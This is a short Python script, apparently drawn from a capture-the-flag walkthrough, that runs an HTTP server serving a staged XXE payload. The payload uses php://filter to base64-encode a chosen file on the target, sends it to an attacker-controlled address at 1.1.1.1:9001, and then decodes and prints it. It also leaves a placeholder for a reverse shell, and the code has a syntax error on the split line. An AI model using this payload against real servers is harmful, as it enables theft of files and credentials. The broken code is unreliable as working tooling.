#!/usr/bin/env python
from http.server import BaseHTTPRequestHandler, HTTPServer
from base64 import b64decode

#from ippsec fulcrum video ~ 38:15 #NOT Tested stagingpayloads.py
#this will vary the response depending on what we receive. we can do multiple staging payloads 
#Could be useful for testing vulnerabilities at large.
class HTTP_RequestHandler(BaseHTTPRequestHandler):
	def do_GET(self):
	
		try:
			stage, data = (self.path.split('?')
			if stage == '/stage1.xml':
				message = """<ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=""" + data + """"> 
	<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://1.1.1.1:9001/stage2.xml?%data;'>">"""

			if stage == '/stage2.xml':
				message = ""
				print(b64decode(data).decode("utf-8"))
		except:
			message = """
			put a reverse shell here(php or other)
			"""
			
		self.send_response(200)
		self.end_headers()
		self.wfile.write(bytes(message, 'utf-8'))
		return
	
	def log_message(self, format, *args):
		return
		
def run():
	print('Starting Server')
	server_address = ('0.0.0.0', 9001)
	httpd = HTTPServer(server_address, HTTP_RequestHandler)
	httpd.serve_forever()

run()
